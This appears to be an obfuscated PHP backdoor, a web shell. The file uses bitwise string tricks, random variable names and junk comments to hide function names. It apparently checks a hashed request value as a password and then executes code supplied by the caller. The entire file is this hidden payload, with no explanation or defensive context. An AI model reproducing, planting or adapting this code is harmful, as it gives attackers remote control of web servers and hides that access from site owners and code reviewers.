<?php
$I8Uk='HQ5'^~ZwvLLv2;$jLDT3uDLz='D  '|'e  ';$ej='|oit:A'^'##O!q{';$y_='(!B %H'|'8)P0'.
      '%L';$i5QWMawTn='-)v^kT>]~/so9~'&'=y?'.nvwoO.'(-[O}^';$U3Al=#r36TkkIygvnkNT3GE'.
      'aW.}u{_Lu~n|)tN'&wzqC.'|a_e?ob2{M^';$Ex="uz/i0K}-9FS/0R="^#VxffI4DB4DoiQDdnG6'.
      '6ZJI`.)OY$2kp=]';$ddpG=a^P;$uZSycl=M1N^'$u{';$YzSNX2e1tz='H@D'|HTT;$maHEzT=/*'.
      '_MMAmjA*/yjw^')56';$haYj1XZp6Ww='"'^j;$HLxFu="^WP_}_u{"&UT__Z_.']T';$sF3=/*ob'.
      'G0SC2n:D*/"&r"^y1;$aXiorz0EuRp=AHLINDODIJD.'[H'|'ALD@'.FCXLHDANA;$njWCm8w5=/*'.
      'y0|H_qdNJ*/e^'!';$yQypwCe8E=$jLDT3uDLz|$uZSycl;$rH9ctUKmF_D=$ej^$y_;$fE=/*YPN'.
      '@dt1BM6N*/$i5QWMawTn^('~iz"=+],^z?>w?'&'OJ[~=q_8{w5{_=');$dFe=$U3Al|$Ex;if(/*'.
      'iOs*/$yQypwCe8E($rH9ctUKmF_D($YzSNX2e1tz.$maHEzT))==('$d15$'.B13a9.' '|'1D!4d'.
      '`$#@)1').('6) e(13Db0!05`'|'310'.D101.'`#4d0$A').$ddpG.(W^d).('3;k>{'&#PA7v_H'.
      '}}w52'))$fE($dFe(false,$rH9ctUKmF_D($haYj1XZp6Ww.$HLxFu.$sF3.$aXiorz0EuRp./*p'.
      'hb;*/$njWCm8w5)));#PsZ$C||I}-6uJ~g^AX1igSDmHhK&v bPIuz4n3BW#G<GoYS* tt5[@;:)'.
      'Mxxu2:(G%H?~vf8Z5AxBcvq(sW{&JRB J;kt2yijm@E3-;Z)vFJ^4a7lxg!jkfg4';